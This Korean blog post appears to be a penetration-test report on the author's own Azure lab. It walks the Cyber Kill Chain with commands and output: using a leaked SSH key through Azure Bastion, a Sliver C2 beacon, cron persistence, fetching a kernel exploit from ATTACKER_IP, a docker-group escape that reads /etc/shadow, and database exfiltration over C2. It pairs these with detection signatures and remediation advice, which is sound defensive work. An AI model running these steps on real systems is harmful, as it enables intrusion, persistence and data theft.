---
layout: post
title: "CyberKillChain-B: 자격 증명 유출을 통한 Bastion Host 침투 및 내부망 장악 보고서"
date: 2025-11-22 14:00:00 +0900
categories: [penetration-testing, attack-simulation, cloud-security, iam-security, credential-stuffing]
---

### **목차**
- [0. 모의 해킹 개요](#0-모의-해킹-개요)
  - [0.1. 목적](#01-목적)
  - [0.2. 방법론](#02-방법론)
  - [0.3. 시스템 아키텍처](#03-시스템-아키텍처)
- [1. 정찰 (Reconnaissance)](#1-정찰-reconnaissance)
- [2. 무기화 (Weaponization)](#2-무기화-weaponization)
- [3. 유포 (Delivery)](#3-유포-delivery)
- [4. 악용 (Exploitation)](#4-악용-exploitation)
- [5. 설치 (Installation)](#5-설치-installation)
- [6. 명령 및 제어 (Command and Control)](#6-명령-및-제어-command-and-control)
- [7. 목적 달성 (Action on Objectives)](#7-목적-달성-action-on-objectives)
  - [7.1. 1단계: 권한 상승 (Privilege Escalation)](#71-1단계-권한-상승-privilege-escalation)
  - [7.2. 2단계: 내부 정찰 및 수평 이동 (Internal Reconnaissance & Lateral Movement)](#72-2단계-내부-정찰-및-수평-이동-internal-reconnaissance--lateral-movement)
  - [7.3. 3단계: 핵심 데이터 수집 및 유출 (Collection & Exfiltration)](#73-3단계-핵심-데이터-수집-및-유출-collection--exfiltration)
- [8. 종합 분석 및 권고 사항](#8-종합-분석-및-권고-사항)

---

## 0. 모의 해킹 개요

### 0.1. 목적

본 보고서는 `CKCProject` 환경을 대상으로, **유출된 관리자 자격 증명(SSH Private Key)**을 이용한 공격 시나리오의 결과와 분석을 기술한다. 본 모의 해킹의 목적은 기술적 취약점이 아닌 **신원 및 접근 관리(IAM)의 실패**가 어떻게 클라우드 환경의 정교한 다층 방어 체계를 완벽히 우회하고, 관리용 진입점인 **Azure Bastion**을 통해 내부망 전체를 장악하는 결과로 이어질 수 있는지를 증명하는 데 있다.

### 0.2. 방법론

본 모의 해킹은 사이버 킬체인(Cyber Kill Chain) 방법론을 채택하였으며, 각 공격 행위는 **MITRE ATT&CK® 프레임워크**에 매핑하여 분석했다. 특히 정찰 단계에서 오픈 소스 정보(OSINT)를 활용하여 유출된 자격 증명을 확보하는 과정을 핵심적으로 다룬다.

### 0.3. 시스템 아키텍처

테스트 대상 환경의 아키텍처는 시나리오 A와 동일하다. 그러나 본 시나리오의 공격 경로는 Load Balancer를 통한 '정문'이 아닌, Azure Bastion을 통해 Private Subnet으로 직접 이어지는 관리자용 '비밀 통로'를 이용한다.

```mermaid
graph LR
    Attacker[Operator (PC)] -- "Leaked SSH Key" --> Bastion[Azure Bastion]
    Bastion -- "SSH Tunnel" --> WebVM[Web Server (Private)]
    WebVM -- "Lateral Movement" --> DBVM[DB Server (Private)]
    WebVM -- "C2 Callback" --> NAT[NAT Gateway]
    NAT -- "Internet" --> C2Server[Attacker C2 Server]
```

---

## 1. 정찰 (Reconnaissance)

**목표:** 공개된 정보 소스를 통해 목표 시스템에 접근할 수 있는 민감한 정보, 특히 자격 증명을 수집.

#### 실행 및 분석

본 시나리오의 정찰은 네트워크 스캐닝이 아닌, **오픈 소스 정보(OSINT)** 수집에 중점을 둔다. 공격자는 목표 조직의 개발자들이 활동할 가능성이 높은 공개 코드 리포지토리를 탐색하는 전략을 선택했다.

**1. [T1596.001] Search Open Technical Databases: Code Repositories**

목표 조직 개발자의 공개 GitHub 리포지토리를 대상으로 자동화된 비밀 정보 스캐닝 도구(`truffleHog`)를 실행했다.

```bash
# trufflehog git https://github.com/HamaPr/CyberKillChainProject.git
--------------------------------------------------------------------------------
Target: https://github.com/HamaPr/CyberKillChainProject.git
--------------------------------------------------------------------------------
Found unverified result 🐷🔑
Detector Type: Private Key
Decoder Type: PRIVATE KEY
Raw result: -----BEGIN RSA PRIVATE KEY-----
MIIEpQIBAAKCAQEAwc...
...
-----END RSA PRIVATE KEY-----
Commit: 12a3b4c5d6e7f8g9h0i1j2k3l4m5n6o7p8q9r0s
Branch: feature/bastion-setup
Path: .ssh/id_rsa
--------------------------------------------------------------------------------
```

**분석:**
*   스캐닝 결과, `feature/bastion-setup` 브랜치의 과거 커밋 기록에서 삭제되지 않은 **SSH Private Key (`id_rsa`)**가 발견되었다.
*   개발자가 Bastion 접속 테스트를 위해 키를 리포지토리에 포함했다가, 나중에 파일만 삭제하고 커밋 히스토리를 정리하지 않은(Squash/Rebase 미수행) 실수가 원인이다.

> **[스크린샷 1 위치: truffleHog 실행 결과 터미널 화면]**

**결론:** 단 하나의 민감 정보 유출(SSH 키)이 복잡한 네트워크 방어 체계를 무력화시킬 수 있는 '만능 열쇠'가 될 수 있음을 확인했다.

#### 탐지 서명 (Detection Signatures)

*   **Secret Scanning:**
    *   **Signature:** GitHub/GitLab 등의 공개 리포지토리에서 자사 도메인, IP, 또는 특정 키워드(password, key)가 포함된 코드 커밋 탐지 (TruffleHog, GitGuardian).


---

## 2. 무기화 (Weaponization)

**목표:** 획득한 정보를 공격에 사용할 수 있는 형태로 가공하고, 후속 조치를 위한 도구를 준비.

#### 실행 및 분석

**1. [T1587.003] Develop Capabilities: Digital Certificates**

탈취한 SSH Private Key는 그 자체로 인증서이자 공격의 핵심 '무기'이다.

```bash
# Save leaked key and set permissions
$ cat > leaked_id_rsa <<EOF
-----BEGIN RSA PRIVATE KEY-----
...
-----END RSA PRIVATE KEY-----
EOF
$ chmod 600 leaked_id_rsa
```

**2. [T1608.005] Stage Capabilities: C2 Channel**

초기 침투 후 안정적인 제어권 확보를 위한 2차 페이로드(C2 Beacon) 준비.

```bash
# Generate Sliver C2 Beacon
sliver > generate --mtls 104.x.x.x --os linux --arch amd64 --save /tmp/genesis_bastion.elf
[*] Generated beacon /tmp/genesis_bastion.elf
```

**결론:** 접근과 제어를 위한 두 가지 유형의 무기를 준비함으로써, 일회성 침투가 아닌 지속적인 내부 장악을 목표로 하는 공격 계획을 수립했다.

#### 탐지 서명 (Detection Signatures)

*   **N/A:** 공격자의 로컬 환경에서 수행되므로 내부 시스템에서 탐지할 수 없음.


---

## 3. 유포 (Delivery)

**목표:** 무기화된 공격(SSH 키)을 목표 시스템(Azure Bastion)에 전달하여 초기 접근을 시도.

#### 실행 및 분석

공격은 정상적인 관리 활동으로 완벽하게 위장된다.

**1. [T1133] External Remote Services**

Azure Bastion과 같은 외부 원격 관리 서비스를 통해 공격을 유포. 공격자는 탈취한 SSH 키를 사용하여 **Azure CLI**를 통해 내부 Private Subnet의 웹 서버 인스턴스로의 SSH 연결을 시도했다.

```bash
# Connect via Azure Bastion using leaked key
$ az network bastion ssh --name "CKCProject-bastion" \
  --resource-group "04-hamap" \
  --target-resource-id "/subscriptions/.../CKCProject-web-vmss_0" \
  --auth-type "sshKey" --username "attacker" --ssh-key "./leaked_id_rsa"

Command group 'network bastion' is in preview and under development.
Reference and usage of this command is subject to change.
```

Azure Bastion은 이 연결 요청을 받아, 유효한 키임을 확인하고 공격자의 PC와 내부 웹 서버 인스턴스 간에 안전한 터널을 생성했다. 이 SSH 터널이 바로 공격의 '유포' 경로가 되었다.

> **[스크린샷 2 위치: az network bastion ssh 명령어가 오류 없이 실행되는 터미널 화면]**

**결론:** 정상적인 관리 채널을 이용했기 때문에, 네트워크 수준에서는 이 공격을 악의적인 행위로 탐지하기가 거의 불가능하다.

#### 탐지 서명 (Detection Signatures)

*   **Cloud Audit Logs (Azure Monitor):**
    *   **Signature:** Azure Bastion에 평소와 다른 공인 IP(Source IP)에서 접속 시도 발생.
    *   **Signature:** 휴면 상태이거나 퇴사한 사용자의 계정/키를 이용한 접속 시도.


---

## 4. 악용 (Exploitation)

**목표:** 유효한 자격 증명을 이용하여 시스템 인증을 통과하고, 대화형 셸(Interactive Shell)을 획득.

#### 실행 및 분석

이 시나리오의 '취약점'은 소프트웨어의 결함이 아닌, **신뢰할 수 있는 사용자의 개인 키가 유출된 신원 관리(Identity Management)의 실패**이다.

**1. [T1078] Valid Accounts**

탈취한 유효한 계정(SSH 키)을 사용하여 시스템에 접근.

```bash
Welcome to Ubuntu 20.04.4 LTS (GNU/Linux 5.13.0-1021-azure x86_64)

 * Documentation:  https://help.ubuntu.com
 * Management:     https://landscape.canonical.com
 * Support:        https://ubuntu.com/advantage

attacker@CKCProject-web-vmss_0:~$ whoami
attacker
attacker@CKCProject-web-vmss_0:~$ hostname
CKCProject-web-vmss_0
```

SSH 프로토콜은 `attacker` 사용자의 공개 키와 공격자가 제시한 개인 키를 비교하여 인증을 성공시켰다. 그 결과, 공격자는 아무런 장애 없이 `attacker` 사용자 권한의 대화형 셸을 내부 웹 서버 인스턴스에서 획득했다.

> **[스크린샷 3 위치: Bastion 접속 성공 후, attacker 셸 프롬프트가 나타난 터미널 화면]**

**결론:** 강력한 네트워크 보안 정책도 유효한 자격 증명 앞에서는 무력화될 수 있음을 증명했다.

#### 탐지 서명 (Detection Signatures)

*   **Endpoint (Auditd/Syslog):**
    *   **Signature:** `sshd` 로그에서 Public Key 인증 성공 이벤트 발생 (특히 업무 시간 외).
    *   **Signature:** 새로운 IP 주소에서의 로그인 성공 (`Accepted publickey for ...`).


---

## 5. 설치 (Installation)

**목표:** 획득한 대화형 셸을 통해, 영구적인 접근을 위한 C2 백도어를 설치하고 시스템 내 지속성을 확보.

#### 실행 및 분석

획득한 SSH 셸은 안정적이지만, 키가 폐기되거나 비밀번호가 변경되면 접근이 불가능해진다. 따라서 영구적인 접근을 위해 C2 Beacon을 설치한다.

**1. [T1105] Ingress Tool Transfer**

Bastion을 통해 연결된 SSH 세션에서, `scp`를 사용하여 C2 서버에 준비된 Sliver Beacon(`genesis_bastion.elf`)을 웹 서버의 `/tmp` 디렉터리로 업로드했다.

```bash
# Upload C2 beacon via SCP (using the established tunnel)
$ scp -i ./leaked_id_rsa ./genesis_bastion.elf attacker@10.0.1.4:/tmp/genesis_bastion.elf
genesis_bastion.elf                          100%   12MB  11.5MB/s   00:01
```

**2. [T1053.003] Scheduled Task/Job: Cron**

업로드된 Beacon을 백그라운드 프로세스로 실행하고, `crontab`에 등록하여 시스템 재부팅 후에도 C2 연결이 유지되도록 설정했다.

```bash
attacker@CKCProject-web-vmss_0:~$ chmod +x /tmp/genesis_bastion.elf
attacker@CKCProject-web-vmss_0:~$ (crontab -l 2>/dev/null; echo "* * * * * /tmp/genesis_bastion.elf") | crontab -
attacker@CKCProject-web-vmss_0:~$ crontab -l
* * * * * /tmp/genesis_bastion.elf
```

> **[스크린샷 4 위치: crontab -l로 악성 cron job이 성공적으로 등록된 것을 보여주는 터미널 화면]**

**결론:** 일시적인 관리자 접근을 탐지가 어려운 영구적인 백도어로 전환하는 데 성공했다.

#### 탐지 서명 (Detection Signatures)

*   **Endpoint (EDR):**
    *   **Signature:** `scp`를 통해 `/tmp` 등 실행 권한이 있는 임시 디렉터리에 실행 파일(`elf`) 생성.
    *   **Signature:** `crontab` 파일 수정 또는 새로운 Cron Job 등록 (`/var/log/cron`).


---

## 6. 명령 및 제어 (Command and Control)

**목표:** 설치된 C2 Beacon을 통해 감염된 시스템과 안정적인 원격 제어 채널을 수립.

#### 실행 및 분석

**1. [T1071.001] Application Layer Protocol: Web Protocols**

설치된 Beacon은 NAT Gateway를 통해 C2 서버로 콜백했다. 공격자의 Sliver 클라이언트에는 **`attacker` 사용자 권한의 세션**이 생성되었다.

```bash
sliver > sessions

 ID          Transport   Remote Address        Hostname                 Username   Operating System   Last Check-in
==========  =========== ===================== ======================== ========== ================== ===============
 9a8b7c6d    mtls        20.x.x.x:49281        CKCProject-web-vmss_0    attacker   linux/amd64        2s ago
```

> **[스크린샷 5 위치: Sliver C2 서버 터미널에 attacker 사용자 권한으로 새로운 세션이 활성화된 목록]**

**결론:** 훨씬 더 유리한 조건에서 내부망 공격을 시작할 수 있는 안정적인 C2 거점을 확보했다.

#### 탐지 서명 (Detection Signatures)

*   **Network:**
    *   **Signature:** 내부 호스트가 외부의 알려지지 않은 IP(C2 서버)와 주기적인 통신(Beaconing) 수행.
    *   **Signature:** 비표준 포트 또는 사설 인증서(Self-signed Cert)를 사용하는 TLS 통신.


---

## 7. 목적 달성 (Action on Objectives)

**목표:** `attacker` 권한을 발판 삼아 시스템을 완전히 장악하고, 최종 목표인 데이터 유출을 달성.

### 7.1. 1단계: 권한 상승 (Privilege Escalation)

**목표:** `attacker` 계정에서 시스템 전체를 제어하는 `root` 권한으로 상승시키기 위해, 확인된 모든 공격 경로를 탐색 및 실행.

#### 실행 및 분석

`attacker` 세션에서 시스템을 분석한 결과, OS 자체의 취약점과 Docker 환경의 설정 오류라는 두 가지 독립적인 권한 상승 경로를 발견했다.

**경로 1: 커널 익스플로잇을 통한 권한 상승 (Kernel Exploit)**

**1. [T1068] Exploitation for Privilege Escalation**

```bash
attacker@CKCProject-web-vmss_0:~$ uname -a
Linux CKCProject-web-vmss_0 5.13.0-1021-azure #23~18.04.1-Ubuntu SMP ... x86_64

# Download and compile CVE-2021-3493 (OverlayFS)
attacker@CKCProject-web-vmss_0:~$ wget http://ATTACKER_IP/exploit.c
attacker@CKCProject-web-vmss_0:~$ gcc exploit.c -o exploit
attacker@CKCProject-web-vmss_0:~$ ./exploit
[+] Entering OverlayFS namespace...
[+] Escalating privileges...
# whoami
root
```

> **[스크린샷 6 위치: uname -a로 취약한 커널 버전 확인 후, Exploit 실행으로 root 셸을 획득한 터미널 화면]**

**경로 2: 컨테이너 탈출을 통한 권한 상승 (Docker Escape)**

**1. [T1611] Escape to Host**

`attacker` 사용자가 **`docker` 그룹**에 포함되어 있음을 확인했다. 이는 호스트의 Docker 데몬을 제어할 수 있는 과도한 권한이다.

```bash
attacker@CKCProject-web-vmss_0:~$ id
uid=1000(attacker) gid=1000(attacker) groups=1000(attacker),999(docker)

# Mount host root filesystem to a new container
attacker@CKCProject-web-vmss_0:~$ docker run --rm -it -v /:/hostFS alpine chroot /hostFS

# Now inside the container, but with host's filesystem mounted as root
/ # whoami
root
/ # cat /etc/shadow | head -n 1
root:!:19000:0:99999:7:::
```

이 공격은 컨테이너 내부에서 호스트 시스템의 **완벽한 `root` 셸**을 획득하게 해준다.

> **[스크린샷 7 위치: docker run 명령어 실행 후, 셸 프롬프트가 #으로 바뀌고 whoami 결과가 root로 출력되는 터미널 화면]**

**결론:** OS 자체의 취약성과 컨테이너 환경의 심각한 설정 오류를 모두 공략하여 `root` 권한을 획득했다.

#### 탐지 서명 (Detection Signatures)

*   **Endpoint (EDR):**
    *   **Signature:** `gcc`, `make` 등 개발 도구가 운영 서버에서 실행됨 (Exploit 컴파일).
    *   **Signature:** `docker run` 명령어에 `--privileged`, `-v /:/...` 등 위험한 플래그 사용.
    *   **Signature:** 컨테이너 내부에서 호스트 파일시스템 마운트 및 `chroot` 실행.


### 7.2. 2단계: 내부 정찰 및 수평 이동 (Internal Reconnaissance & Lateral Movement)

**목표:** `root` 권한을 이용하여 내부망의 다른 서버로 자유롭게 이동하고 공격 범위를 확장.

#### 실행 및 분석

**1. [T1021.004] Remote Services: SSH**

`root` 권한으로 웹 서버의 `/home/attacker/.ssh/` 디렉터리를 분석하여, DB 서버(`10.42.3.5`)로 암호 없이 접속 가능한 키 파일을 확보했다.

```bash
# Check for SSH keys used for automation
root@CKCProject-web-vmss_0:~# ls -l /home/attacker/.ssh/
total 12
-rw------- 1 attacker attacker 1679 Nov 21 10:00 id_rsa_db
-rw-r--r-- 1 attacker attacker  398 Nov 21 10:00 id_rsa_db.pub

# Lateral movement to DB server
root@CKCProject-web-vmss_0:~# ssh -i /home/attacker/.ssh/id_rsa_db dbadmin@10.42.3.5
Welcome to Ubuntu 20.04.4 LTS...
dbadmin@db-vm-01:~$
```

> **[스크린샷 8 위치: 웹 서버 root 셸에서 DB 서버로 ssh 접속에 성공하여, DB 서버의 호스트명을 확인하는 장면]**

**결론:** 관리자 권한으로 탈취한 SSH 키를 이용하여, 별도의 인증 과정 없이 내부망의 핵심 DB 서버로 이동했다.

#### 탐지 서명 (Detection Signatures)

*   **Network:**
    *   **Signature:** 웹 서버(DMZ)에서 내부 DB 서버로의 SSH(22) 연결 시도.
*   **Endpoint:**
    *   **Signature:** 사용자 홈 디렉터리 내 `.ssh` 폴더 접근 및 `id_rsa` 파일 읽기 행위.


### 7.3. 3단계: 핵심 데이터 수집 및 유출 (Collection & Exfiltration)

**목표:** 최종 목표인 DB 서버의 데이터를 외부로 유출.

#### 실행 및 분석

**1. [T1005] Data from Local System & [T1041] Exfiltrate Data Over C2 Channel**

DB 서버에 2차 C2 Beacon을 설치하고, `mysqldump`로 데이터베이스 전체를 백업한 후, C2 채널을 통해 공격자의 서버로 안전하게 유출했다.

```bash
# On DB Server
dbadmin@db-vm-01:~$ mysqldump -u root -p --all-databases > /tmp/all_db.sql
dbadmin@db-vm-01:~$ tar czf /tmp/all_db.tar.gz /tmp/all_db.sql

# Exfiltrate via C2
sliver (DB-VM-01) > download /tmp/all_db.tar.gz
```

**결론:** 작전의 최종 목표인 **핵심 데이터 유출**이 완벽하게 달성되었다.

#### 탐지 서명 (Detection Signatures)

*   **Network:**
    *   **Signature:** DB 서버에서 외부 IP로의 직접적인 아웃바운드 연결.
*   **Endpoint:**
    *   **Signature:** `mysqldump` 실행 및 대용량 SQL 파일 생성.


---

## 8. 종합 분석 및 권고 사항 (Comprehensive Analysis and Recommendations)

### 8.1. 종합 분석: IAM 및 컨테이너 보안의 실패

본 시나리오는 기술적인 해킹 기법보다는 **관리적 보안 실패(IAM)**와 **구성 오류(Configuration Error)**가 어떻게 시스템 전체의 붕괴를 초래하는지를 극명하게 보여준다.

*   **문제점 1: 자격 증명 수명주기 관리 부재 (Credential Lifecycle Management Failure)**
    *   **분석:** 개발자가 테스트 목적으로 생성한 SSH 키가 코드 리포지토리에 방치되었고, 이를 탐지하거나 폐기하는 프로세스가 없었다. 또한, 중요 인프라 접근용 키가 암호(Passphrase) 없이 평문으로 저장되어 있어, 유출 즉시 악용될 수 있었다.
*   **문제점 2: 과도한 권한 부여 (Least Privilege Violation)**
    *   **분석:** `attacker` 계정은 일반 사용자임에도 불구하고 `docker` 그룹에 포함되어 있었다. Docker 아키텍처 상 `docker` 그룹 멤버십은 사실상 `root` 권한과 동등하다는 점을 간과한 설정이다. 이로 인해 공격자는 컨테이너 기능을 악용하여 호스트를 장악할 수 있었다.
*   **문제점 3: Bastion Host의 단일 인증 의존 (Single Factor Authentication)**
    *   **분석:** 내부망으로 통하는 유일한 관문인 Azure Bastion이 오직 SSH 키라는 단일 인증 수단에만 의존하고 있었다. MFA(다단계 인증)가 적용되지 않아, 키 탈취가 곧바로 내부망 침투로 이어졌다.

### 8.2. 보안 강화 로드맵: 단계별 개선 방안

식별된 취약점을 해결하고 유사한 공격을 방지하기 위해 다음과 같은 보안 강화 대책을 제안한다.

#### [긴급] 즉시 조치 사항 (24시간 내 수행 권고)

1.  **모든 SSH 키 교체 및 MFA 적용:**
    *   유출된 키와 관련된 모든 서버의 `authorized_keys`를 갱신하고, Azure Bastion 접근 시 **Azure AD 기반의 MFA(다단계 인증)**를 강제화한다.
2.  **Docker 그룹 권한 제거:**
    *   모든 일반 사용자 계정을 `docker` 그룹에서 즉시 제거한다. 컨테이너 관리가 필요한 경우, 제한된 권한을 가진 별도의 서비스 계정을 사용하거나 `sudo`를 통해 특정 명령어만 허용하도록 변경한다.

#### [중기] 인프라 방어 강화 (3개월 내 수행 권고)

1.  **Secret Scanning 파이프라인 구축:**
    *   GitHub 및 GitLab과 같은 코드 저장소에 `TruffleHog`나 `GitGuardian`과 같은 도구를 CI/CD 파이프라인에 통합하여, 커밋 단계에서 비밀 정보가 포함되는 것을 원천 차단한다.
2.  **Rootless Docker 도입:**
    *   Docker 데몬이 `root` 권한으로 실행되는 현재 구조를 개선하여, 일반 사용자 권한으로 컨테이너를 실행할 수 있는 **Rootless Docker** 모드를 도입, 컨테이너 탈출 시 호스트 장악 위험을 최소화한다.

#### [장기] 지속 가능한 보안 체계 구축 (1년 내 구축 목표)

1.  **Zero Trust Network Access (ZTNA) 도입:**
    *   VPN이나 Bastion과 같은 경계 기반 접근 제어를 넘어, 사용자 신원, 기기 상태, 접속 맥락을 실시간으로 검증하여 애플리케이션별로 접근을 허용하는 ZTNA 솔루션을 도입한다.
2.  **컨테이너 런타임 보안 (Container Runtime Security):**
    *   Falco와 같은 런타임 보안 도구를 도입하여, 컨테이너 내부에서 셸 실행, 민감한 파일 접근, 비정상적인 네트워크 연결 등 의심스러운 행위를 실시간으로 탐지하고 차단하는 체계를 구축한다.
